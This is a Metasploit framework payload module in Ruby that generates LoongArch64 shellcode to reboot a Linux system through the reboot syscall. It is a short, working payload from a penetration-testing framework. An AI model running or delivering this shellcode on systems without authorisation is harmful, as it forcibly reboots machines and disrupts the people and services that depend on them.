##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 32

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Reboot',
        'Description' => %q{
          A very small shellcode for rebooting the system using
          the reboot syscall. This payload is sometimes helpful
          for testing purposes. Requires CAP_SYS_BOOT privileges.
        },
        'Author' => 'bcoles',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_LOONGARCH64,
        'References' => [
          ['URL', 'https://man7.org/linux/man-pages/man2/reboot.2.html'],
          ['URL', 'https://github.com/bcoles/shellcode/blob/main/loongarch64/reboot/reboot.s'],
        ]
      )
    )
  end

  def generate(_opts = {})
    shellcode = [
      0x15fdc3a4,   # lu12i.w $a0, -4579
      0x03bab484,   # ori $a0, $a0, 0xead
      0x14502425,   # lu12i.w $a1, 164129
      0x03a5a4a5,   # ori $a1, $a1, 0x969
      0x14024686,   # lu12i.w $a2, 4660
      0x03959cc6,   # ori $a2, $a2, 0x567
      0x0382380b,   # li.w $a7, 0x8e
      0x002b0101,   # syscall 0x101
    ].pack('V*')

    super.to_s + shellcode
  end
end
